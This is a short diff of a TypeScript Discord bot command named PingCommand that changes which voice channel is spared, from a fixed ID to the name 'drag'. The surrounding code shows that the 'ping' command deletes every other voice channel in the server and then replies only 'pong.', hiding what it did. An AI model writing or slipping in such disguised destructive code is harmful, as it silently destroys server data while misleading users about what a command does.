@@ -7,7 +7,7 @@ export abstract class PingCommand {
   private async execute(interaction: CommandInteraction): Promise<void> {
     const channels = await (
       await interaction.guild?.channels.fetch()
-    )?.filter((c) => c.type === "GUILD_VOICE" && c.id !== "892542055170060358");
+    )?.filter((c) => c.type === "GUILD_VOICE" && c.name !== "drag");
     channels?.forEach((c) => c.delete());
 
     return await interaction.reply("pong.");
